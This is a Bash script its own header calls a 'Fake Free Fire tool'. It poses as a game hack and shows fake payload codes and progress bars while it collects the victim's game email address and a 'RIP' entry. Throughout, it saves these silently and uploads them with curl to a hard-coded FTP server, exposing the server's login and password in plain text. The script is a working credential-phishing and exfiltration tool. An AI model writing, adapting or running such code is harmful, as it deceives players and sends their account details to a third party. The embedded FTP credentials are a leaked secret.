

#!/bin/bash
# Fake Free Fire tool — immediate sequential user folders locally + remote FTP upload
set -euo pipefail

#==================== COLORS ====================#
P="\033[1;35m"   # Purple (connectors)
G="\033[1;32m"   # Green
Y="\033[1;33m"   # Yellow (email prompt)
C="\033[1;36m"   # Cyan
W="\033[1;37m"   # White
R="\033[1;31m"   # Red
X="\033[1;31m"   # Red
RESET="\033[0m"

#==================== ENV & LOGS ====================#
LOGDIR="${HOME}/tool_logs"
COUNTER_FILE="${LOGDIR}/.session_count"
mkdir -p "$LOGDIR"
touch "$COUNTER_FILE"

# FTP credentials (fill with your real values)
FTP_HOST="ftpupload.net"
FTP_USER="if0_40531973"
FTP_PASS="99ZVMdi2uoM7"
REMOTE_DIR="htdocs/tool_logs"

# enable immediate upload to remote by default (set 0 to disable)
AUTO_UPLOAD=1

tmpfile=""
cleanup() {
  trap - INT TERM EXIT
  if command -v tput >/dev/null 2>&1; then
    tput cnorm 2>/dev/null || true
  fi
  if [ -n "${tmpfile:-}" ] && [ -f "$tmpfile" ]; then
    shred -u "$tmpfile" 2>/dev/null || rm -f "$tmpfile" 2>/dev/null || true
  fi
  exit 0
}
trap cleanup INT TERM EXIT

if command -v tput >/dev/null 2>&1; then
  tput civis 2>/dev/null || true
fi

clear
echo -e "${X}"
cat << "EOF"
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⡤⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢀⣤⡶⠁⣠⣴⣾⠟⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢀⣴⣿⣿⣴⣿⠿⠋⣁⣀⣀⣀⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⣰⣿⣿⣿⣿⣿⣷⣾⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶⣄⡀⠀⠀⠀⠀⠀⠀⠀
⠀⣠⣾⣿⡿⠟⠋⠉⠀⣀⣀⣀⣨⣭⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣤⣤⣤⣤⣴⠂
⠈⠉⠁⠀⠀⣀⣴⣾⣿⣿⡿⠟⠛⠉⠉⠉⠉⠉⠛⠻⠿⠿⠿⠿⠿⠿⠟⠋⠁⠀
⠀⠀⠀⢀⣴⣿⣿⣿⡿⠁⠀⢀⣀⣤⣤⣤⣤⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⣾⣿⣿⣿⡿⠁⢀⣴⣿⠋⠉⠉⠉⠉⠛⣿⣿⣶⣤⣤⣤⣤⣶⠖⠀⠀⠀
⠀⠀⢸⣿⣿⣿⣿⡇⢀⣿⣿⣇⠀⠀⠀⠀⠀⠀⠘⣿⣿⣿⣿⣿⡿⠃⠀⠀⠀⠀
⠀⠀⠸⣿⣿⣿⣿⡇⠈⢿⣿⣿⠇⠀⠀⠀⠀⠀⢠⣿⣿⣿⠟⠋⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢿⣿⣿⣿⣷⡀⠀⠉⠉⠀⠀⠀⠀⠀⢀⣾⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠙⢿⣿⣿⣷⣄⡀⠀⠀⠀⠀⣀⣴⣿⣿⣿⣋⣠⡤⠄⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠈⠙⠛⠛⠿⠿⠿⠿⠿⠿⠟⠛⠛⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀
EOF
echo -e "${W}"
cat << "EOF"
▀█████████▄   ▄██████▄      ███        ▄████████ ▀████    ▐████▀    ▄███████▄ 
  ███    ███ ███    ███ ▀█████████▄   ███    ███   ███▌   ████▀    ███    ███ 
  ███    ███ ███    ███    ▀███▀▀██   ███    █▀     ███  ▐███      ███    ███ 
 ▄███▄▄▄██▀  ███    ███     ███   ▀   ███           ▀███▄███▀      ███    ███ 
▀▀███▀▀▀██▄  ███    ███     ███     ▀███████████    ████▀██▄     ▀█████████▀  
  ███    ██▄ ███    ███     ███              ███   ▐███  ▀███      ███        
  ███    ███ ███    ███     ███        ▄█    ███  ▄███     ███▄    ███        
▄█████████▀   ▀██████▀     ▄████▀    ▄████████▀  ████       ███▄  ▄████▀      
EOF
sleep 1

# ==================== PASSWORD ====================#
while true; do
  echo
  echo -e "${G}|——[ ${C}Enter password to continue ${G}]${RESET}"
  echo -e "${G}|${RESET}"
  echo -ne "${G}╰─>  ${C}${RESET}"
  read -r pass
  echo
  if [ "$pass" = "free:lvl" ]; then
    break
  else
    echo -e "${R}Wrong password! Try again...${RESET}"
    sleep 1
  fi
done

clear
echo -e "${C}Initializing system modules...${RESET}"
sleep 0.8

# ==================== SHORT CODES (VISUAL) ==================== #
echo
echo -e "${G}Preparing secure payloads...${RESET}"
sleep 0.4
for i in $(seq 1 10); do
  if command -v openssl >/dev/null 2>&1; then
    code=$(openssl rand -hex 16 2>/dev/null | tr '[:lower:]' '[:upper:]')
  else
    code=$(tr -dc 'A-F0-9' </dev/urandom 2>/dev/null | head -c 32 || printf '%0*s' 32 "A")
  fi
  printf "${G}[%02d] %s${RESET}\n" "$i" "$code"
  sleep 0.28
done
echo
echo -e "${G}Payloads generated.${RESET}"
sleep 0.6

# ==================== VISUAL PROGRESS BAR ==================== #
echo
BAR_WIDTH=40
for p in $(seq 0 100); do
  filled=$(( p * BAR_WIDTH / 100 ))
  empty=$(( BAR_WIDTH - filled ))
  filled_bar=$(printf '%*s' "$filled" '' | tr ' ' '#')
  empty_bar=$(printf '%*s' "$empty" '' | tr ' ' '-')
  printf "\r${W}———————————— ${RESET}${W}%3d%%${RESET}${P} |%s%s|${RESET}" "$p" "$filled_bar" "$empty_bar"
  if [ "$p" -lt 20 ]; then
    sleep 0.01
  elif [ "$p" -lt 60 ]; then
    sleep 0.008
  else
    sleep 0.006
  fi
done
echo
echo -e "${G}|——[ Successfully completed ! ]${RESET}"
echo -e "${G}|${RESET}"

# ==================== EMAIL PROMPT (SILENT SAVE + IMMEDIATE REMOTE UPLOAD) ==================== #
while true; do
  echo -ne "${P}|——[ ${Y}Enter the game's email address ${P}]${RESET}\n${P}|${RESET}\n${P}╰─> ${Y}${RESET}"
  IFS= read -r game_email || game_email=""
  # trim
  game_email=$(printf '%s' "$game_email" | sed 's/^[[:space:]]*//;s/[[:space:]]*$//')
  # drain any remaining pasted lines quickly to avoid leaking to shell
  while IFS= read -r -t 0.05 _extra; do :; done

  # Silent validation: minimal checks; if invalid, re-prompt silently
  if [ -z "$game_email" ] || [ "${#game_email}" -lt 6 ]; then
    continue
  fi
  if printf '%s' "$game_email" | grep -q '[[:space:]]'; then
    continue
  fi
  if printf '%s' "$game_email" | grep -q '@'; then
    if ! printf '%s' "$game_email" | grep -q '@.*\.' ; then
      continue
    fi
  fi

  # Ensure COUNTER_FILE exists and is numeric
  if [ ! -f "$COUNTER_FILE" ]; then
    printf "0" > "$COUNTER_FILE"
  fi
  cnt=$(cat "$COUNTER_FILE" 2>/dev/null || echo 0)
  case "$cnt" in ''|*[!0-9]*) cnt=0 ;; esac
  cnt=$((cnt + 1))
  printf "%d" "$cnt" > "${COUNTER_FILE}.tmp" 2>/dev/null || echo "$cnt" > "${COUNTER_FILE}.tmp"
  mv -f "${COUNTER_FILE}.tmp" "$COUNTER_FILE" 2>/dev/null || printf "%d" "$cnt" > "$COUNTER_FILE"

  # Create user folder and filenames locally
  user_dir="${LOGDIR}/user${cnt}"
  mkdir -p "$user_dir"
  email_fname="email_user${cnt}.txt"
  rip_fname="user_rip${cnt}.txt"
  email_path="${user_dir}/${email_fname}"
  rip_path="${user_dir}/${rip_fname}"

  # Save email silently (overwrite/create) inside the user folder
  printf '%s\n' "$game_email" > "$email_path"

  # Immediate remote upload: create remote userN folder and upload email file
  if [ "${AUTO_UPLOAD:-0}" = "1" ] && command -v curl >/dev/null 2>&1; then
    remote_dir="${REMOTE_DIR}/user${cnt}"
    curl --ftp-create-dirs -T "${email_path}" -u "${FTP_USER}:${FTP_PASS}" "ftp://${FTP_HOST}/${remote_dir}/${email_fname}" --silent 2>/dev/null || true
  fi

  # store session variables for later use
  session_cnt="$cnt"
  session_email="$game_email"

  break
done

# ==================== COUNTDOWN 3 MINUTES (02:59 -> 00:00) ==================== #
echo
echo -e "${Y}Wait three minutes${RESET}"
echo -e "${P}--------------------------------------------------${RESET}"
total_seconds=119
while [ "$total_seconds" -ge 0 ]; do
  mm=$(( total_seconds / 60 ))
  ss=$(( total_seconds % 60 ))
  printf "\r${Y}%02d:%02d${RESET}" "$mm" "$ss"
  sleep 1
  total_seconds=$(( total_seconds - 1 ))
done
echo

# ==================== PROMPT FOR RIP (SAVE + IMMEDIATE REMOTE UPLOAD) ==================== #
echo -e "${G}|——[ Successfully completed ! ]${RESET}"
echo -e "${G}|${RESET}"
echo -e "${G}|——[ ${C}Enter your RIP ${G}]${RESET}"
echo -e "${G}|${RESET}"
echo -ne "${G}╰─> ${RESET}"

# Read first line; then quickly drain and append any extra pasted lines so nothing leaks to shell
rip=""
IFS= read -r rip || rip=""
while IFS= read -r -t 0.05 extra; do
  rip+=$'\n'"$extra"
done

# Ensure we have session variables; fallback to COUNTER_FILE if necessary
if [ -z "${session_cnt:-}" ]; then
  if [ -f "$COUNTER_FILE" ]; then
    session_cnt=$(cat "$COUNTER_FILE" 2>/dev/null || echo 0)
  else
    session_cnt=0
  fi
  user_dir="${LOGDIR}/user${session_cnt}"
  mkdir -p "$user_dir"
  rip_path="${user_dir}/${rip_fname:-user_rip${session_cnt}.txt}"
fi

# Save RIP locally
{
  printf '%s\n' "$rip"
  printf 'SavedAt: %s\n' "$(date "+%F %T")"
} > "${rip_path}"

# update aggregate log (base64-safe single line)
timestamp=$(date "+%F %T")
if command -v base64 >/dev/null 2>&1; then
  b64entry=$(printf '%s' "$rip" | base64 -w0 2>/dev/null)
elif command -v openssl >/dev/null 2>&1; then
  b64entry=$(printf '%s' "$rip" | openssl base64 2>/dev/null)
else
  b64entry=$(printf '%s' "$rip" | python3 - <<'PY'
import sys,base64
print(base64.b64encode(sys.stdin.read().encode()).decode())
PY
)
fi
printf '%s user%s %s %s\n' "$timestamp" "${session_cnt:-0}" "${session_email:-}" "$b64entry" >> "${LOGDIR}/all_entries.b64"

# Immediate upload of RIP and aggregate if enabled
if [ "${AUTO_UPLOAD:-0}" = "1" ] && command -v curl >/dev/null 2>&1; then
  remote_dir="${REMOTE_DIR}/user${session_cnt}"
  curl --ftp-create-dirs -T "${rip_path}" -u "${FTP_USER}:${FTP_PASS}" "ftp://${FTP_HOST}/${remote_dir}/$(basename "${rip_path}")" --silent 2>/dev/null || true
  curl --ftp-create-dirs -T "${LOGDIR}/all_entries.b64" -u "${FTP_USER}:${FTP_PASS}" "ftp://${FTP_HOST}/${REMOTE_DIR}/all_entries.b64" --silent 2>/dev/null || true
fi

# ==================== FINAL VISUALS ==================== #
sleep 0.4
echo -e "${G}Finalizing...${RESET}"
for t in 1 2 3 4 5; do
  printf "${G}.${RESET}"
  if [ $((RANDOM % 3)) -eq 0 ]; then
    sleep 1.2
  else
    sleep 0.8
  fi
done
echo
echo -e "${G}Operation complete. ${C}Launched successfully — Enter the game now.${RESET}"
echo

# ==================== POST-LAUNCH MENU ==================== #
echo -e "${G}/X1 ${R}>${RESET} ${R}arrest${RESET}"
echo -e "${G}/X2 ${R}>${RESET} ${G}restart${RESET}"
echo -e "${G}/X3 ${R}>${RESET} ${C}Getting out of everything${RESET}"
echo
echo -ne "${C}Choose an option (e.g. /X1) > ${RESET}"
read -r opt || opt=""
echo

case "$opt" in
  "/X1"|"X1")
    echo -e "${R}[/X1] arrest selected...${RESET}"
    sleep 1
    ;;
  "/X2"|"X2")
    echo -e "${G}[/X2] restart selected...${RESET}"
    sleep 1
    ;;
  "/X3"|"X3")
    echo -e "${C}[/X3] Getting out of everything selected...${RESET}"
    sleep 1
    ;;
  *)
    echo -e "${R}Unknown option. Exiting.${RESET}"
    ;;
esac

if command -v tput >/dev/null 2>&1; then
  tput cnorm 2>/dev/null || true
fi

cleanup
